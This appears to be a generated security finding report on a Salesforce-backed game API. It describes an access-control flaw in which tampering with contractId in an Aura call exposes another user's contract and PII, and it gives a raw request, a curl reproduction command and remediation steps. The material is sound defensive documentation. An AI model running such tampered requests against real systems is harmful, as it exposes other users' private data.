# Security Analysis Report
**System:** RealmForge Game API (Gaming / MMO Backend) — Salesforce-Integrated
**Classification:** SENSITIVE
**Analyst:** Security Analyst Co-Pilot
**Source:** SF-0032 context.txt (sole artifact)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BAC / Pattern 2.4 | Privilege escalation via parameter tampering — `ContractController.approveContract` tampered `contractId` accesses cross-user MMO account contract |

---

## Finding 1 — Privilege Escalation: Cross-User MMO Contract Data via `contractId` Tampering (CRITICAL)

### Summary
The `ContractController` Apex class on RealmForge Game API (`af040c3f.lightning.force.com`) is declared `without sharing`. Per §5.0 Pattern 2.4, the `approveContract` Aura action is vulnerable to privilege escalation via parameter tampering: the attacker tampers `contractId` to a victim's record (`0010C3F`), escalating from "approve own contracts" to "access any contract." In a gaming MMO platform, Contract records can contain subscription agreements, in-game purchase contracts, and account services data.

**Pattern:** 2.4 — Privilege escalation via parameter tampering (BAC)
**Affected controller:** `c.ContractController.approveContract`
**Affected endpoint:** `POST https://af040c3f.lightning.force.com/aura`

### Evidence from HAR
**Request:**
```
POST https://af040c3f.lightning.force.com/aura HTTP/1.1
Authorization: Bearer 00DAF040C3F!ARaf040c3f...
message={"actions":[{"id":"1;a","descriptor":"c.ContractController.approveContract","params":{"contractId":"0010C3F","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}&aura.token=undefined
```

**Response:** `OwnerId: 005VICTIM`, `SensitiveData__c: SSN: 000-16-5247`

### Evidence Map
| Artifact | Field | Value | Significance |
|---|---|---|---|
| §4.0 Apex | `without sharing` | Class declaration | OWD bypassed |
| §5.0 Pattern 2.4 | Vulnerability | Privilege escalation via tampering | Classification |
| HAR descriptor | `c.ContractController.approveContract` | Aura action | Write action exploited |
| HAR params | `contractId` | `0010C3F` | Tampered — victim's contract |
| HAR response | `OwnerId` | `005VICTIM` | Cross-user escalation confirmed |
| HAR response | `SensitiveData__c` | `SSN: 000-16-5247` | Gamer PII and contract data |

### Steps to Reproduce
```bash
curl -s -X POST "https://af040c3f.lightning.force.com/aura" \
  -H "Authorization: Bearer 00DAF040C3F!ARaf040c3f..." \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.ContractController.approveContract","callingDescriptor":"UNKNOWN","params":{"contractId":"0010C3F","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
```

### Remediation
1. `public with sharing class ContractController {`
2. `WHERE Id = :contractId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Remove client `fields`; define server-side allowlist for contract approval action.
4. Validate `aura.token`. Gaming subscription contracts contain payment data — PCI DSS scope.
